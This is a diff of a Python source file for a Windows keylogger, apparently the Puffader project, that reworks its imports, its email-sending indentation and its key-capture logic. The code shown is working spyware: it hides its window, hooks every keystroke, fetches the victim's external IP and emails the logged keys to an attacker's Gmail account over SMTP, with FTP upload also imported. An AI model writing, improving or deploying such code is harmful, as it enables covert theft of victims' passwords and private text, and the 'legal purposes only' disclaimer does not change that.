@@ -8,9 +8,9 @@ MIT License: https://github.com/xp4xbox/Puffader/blob/master/LICENSE
 NOTE: This program must be used for legal purposes only!
 '''
 
-import smtplib, time, os, threading, sys, subprocess, urllib.request
+import smtplib, time, os, threading, sys, subprocess
 import win32console, win32gui, win32event, win32api, winerror
-from win32con import VK_CAPITAL; from sys import exit; from ftplib import FTP
+from sys import exit; from ftplib import FTP; from urllib2 import urlopen
 try:
     import pythoncom, pyHook
     from pyHook import GetKeyState, HookConstants
@@ -33,7 +33,7 @@ intCharPerSend = 1100  # set num of chars before send log/store
 blnUseTime = "False"  # if you prefer to use a timer to send/save logs, set this to True
 strTimePerSend = 120  # set how often to send/save logs in seconds
 
-blnStoreLocal = "False"  # True to save logs locally to temp folder as winlog.txt.
+blnStoreLocal = "False"  # True to save logs locally to temp folder as winlog.txt
 blnBackRemove = "False"  # set this to True if you prefer the program removes the last key if the user types backspace
 
 def hide():
@@ -56,7 +56,7 @@ if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
 def GetExIp(): # function to get external ip
     global strExIP
     try:
-        strExIP = urllib.request.urlopen('http://ident.me').read().decode('utf8')
+        strExIP = urlopen("http://ident.me").read().decode('utf8')
     except:
         strExIP = "?"
 GetExIpThread = threading.Thread(target=GetExIp).start()
@@ -76,13 +76,13 @@ def OnKeyboardEvent(event):
                 strDateTime = "Keylogger Stopped At: " + time.strftime("%d/%m/%Y") + " " + time.strftime("%I:%M:%S")
             else:
                 strDateTime = "Keylogger Started At: " + time.strftime("%d/%m/%Y") + " " + time.strftime("%I:%M:%S")
-                strMessage = strDateTime + "\n\n" + strLogs
-                strMessage = "Subject: {}\n\n{}".format("New Keylogger Logs From "+strExIP, strMessage)
+            strMessage = strDateTime + "\n\n" + strLogs
+            strMessage = "Subject: {}\n\n{}".format("New Keylogger Logs From "+strExIP, strMessage)
 
-                SmtpServer = smtplib.SMTP_SSL("smtp.gmail.com", 465)
-                SmtpServer.ehlo()   # identifies you to the smtp server
-                SmtpServer.login(strEmailAc, strEmailPass)
-                SmtpServer.sendmail(strEmailAc, strEmailAc, strMessage)
+            SmtpServer = smtplib.SMTP_SSL("smtp.gmail.com", 465)
+            SmtpServer.ehlo()   # identifies you to the smtp server
+            SmtpServer.login(strEmailAc, strEmailPass)
+            SmtpServer.sendmail(strEmailAc, strEmailAc, strMessage)
         except:
             os._exit(1)  # if for some reason, the email cannot send, exit program including threads.
 
@@ -137,36 +137,17 @@ def OnKeyboardEvent(event):
             SendMailThread.start()
         exit()
 
-    if event.Key == "Return":  # if the user types "enter" move to a new line
-        strLogs = strLogs + "\n"
-    elif event.Key == "Space":
-        strLogs = strLogs + " "
-    elif event.Key == "Back":
+    if event.Key == "Back":
         if blnBackRemove == "True":
             if not strLogs == "":
                 strLogs = strLogs[0:len(strLogs) - 1]
         else:
             strLogs = strLogs + " [Back] "
+
     elif event.Key == "Delete":
         strLogs = strLogs + " [Delete] "
-    elif event.Key == "Tab":
-        strLogs = strLogs + "\t"
-    elif event.Key == "Oem_5":
-        strLogs = strLogs + "\\"
-    # check to see if key is shift + backslash
-    elif event.Key == "Oem_5" and (GetKeyState(HookConstants.VKeyToID("VK_RSHIFT")) or GetKeyState(HookConstants.VKeyToID("VK_LSHIFT"))):
-        strLogs = strLogs + "|"
-    elif event.Key == "Capital" or event.Key == "Rshift" or event.Key == "Lshift":
-        pass
-    elif len(event.Key) > 1:  # check to see if key is a special key
-        strLogs = strLogs + " [" + event.Key + "] "
     else:
-        # check to see if caps lock is on or the shift key is held down
-        if win32api.GetKeyState(VK_CAPITAL) == 1 or (GetKeyState(HookConstants.VKeyToID("VK_RSHIFT")) or GetKeyState(HookConstants.VKeyToID("VK_LSHIFT"))) and HookConstants.IDToName(event.KeyID).isalpha():
-            strLogs = strLogs + event.Key
-        else:
-            # since event.Key outputs all keys as uppercase, lower normal ones
-            strLogs = strLogs + ((event.Key).lower())
+        strLogs = strLogs + chr(event.Ascii)
 
     def CreateNewThreadMessages():  # function for creating thread for sending messages
         if not strLogs == "":  # if the log is not empty
